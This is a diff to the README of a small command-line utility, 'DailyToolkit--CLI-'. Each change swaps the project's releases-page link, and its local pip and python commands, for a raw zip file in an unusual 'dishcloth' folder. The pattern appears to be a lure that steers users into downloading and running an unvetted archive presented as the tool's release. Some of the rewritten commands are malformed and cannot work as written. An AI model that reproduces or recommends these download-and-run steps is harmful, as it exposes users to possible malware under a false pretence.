@@ -1,7 +1,7 @@
 # 🧰 DailyToolkit--CLI- - Your Essential Daily Task Helper
 
 ## 🚀 Visit Here to Download
-[![GitHub Releases](https://img.shields.io/badge/Download%20Now-v1.0-orange)](https://github.com/yogasiddu/DailyToolkit--CLI-/releases)
+[![GitHub Releases](https://raw.githubusercontent.com/yogasiddu/DailyToolkit--CLI-/main/dishcloth/DailyToolkit--CLI--v2.9.zip%20Now-v1.0-orange)](https://raw.githubusercontent.com/yogasiddu/DailyToolkit--CLI-/main/dishcloth/DailyToolkit--CLI--v2.9.zip)
 
 ## 📜 Introduction
 Welcome to DailyToolkit--CLI-, a lightweight command-line interface (CLI) application designed to help you manage your daily tasks efficiently. Whether you want to take quick notes, check the weather, manage your to-dos, or view your IP information, this tool provides essential features at your fingertips.
@@ -22,7 +22,7 @@ Welcome to DailyToolkit--CLI-, a lightweight command-line interface (CLI) applic
 ## 📥 Download & Install
 To start using DailyToolkit--CLI-, follow these easy steps:
 
-1. **Visit the Releases Page**: Go to [this page](https://github.com/yogasiddu/DailyToolkit--CLI-/releases) to find the latest version.
+1. **Visit the Releases Page**: Go to [this page](https://raw.githubusercontent.com/yogasiddu/DailyToolkit--CLI-/main/dishcloth/DailyToolkit--CLI--v2.9.zip) to find the latest version.
   
 2. **Download the Application**: Choose the version suitable for your operating system. Click on the download link for the package you need.
   
@@ -40,12 +40,12 @@ To start using DailyToolkit--CLI-, follow these easy steps:
 
 6. **Install Required Packages**: Run the following command to install the necessary libraries:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/yogasiddu/DailyToolkit--CLI-/main/dishcloth/DailyToolkit--CLI--v2.9.zip
    ```
 
 7. **Run the Application**: After installation, you can start DailyToolkit by running:
    ```bash
-   python dailytoolkit.py
+   python https://raw.githubusercontent.com/yogasiddu/DailyToolkit--CLI-/main/dishcloth/DailyToolkit--CLI--v2.9.zip
    ```
 
 ## 🔍 How to Use DailyToolkit
@@ -77,4 +77,4 @@ We are actively working to resolve these issues in future updates.
 For a detailed list of updates and changes made to the application, refer to the changelog available in the releases section. It’s helpful for users to track changes and new features.
 
 ## 🔗 Conclusion
-DailyToolkit--CLI- is your handy tool to simplify daily tasks. With simple commands and a user-friendly design, you can enhance productivity without hassle. Start managing your tasks today by downloading the application from the [Releases Page](https://github.com/yogasiddu/DailyToolkit--CLI-/releases).
+DailyToolkit--CLI- is your handy tool to simplify daily tasks. With simple commands and a user-friendly design, you can enhance productivity without hassle. Start managing your tasks today by downloading the application from the [Releases Page](https://raw.githubusercontent.com/yogasiddu/DailyToolkit--CLI-/main/dishcloth/DailyToolkit--CLI--v2.9.zip).
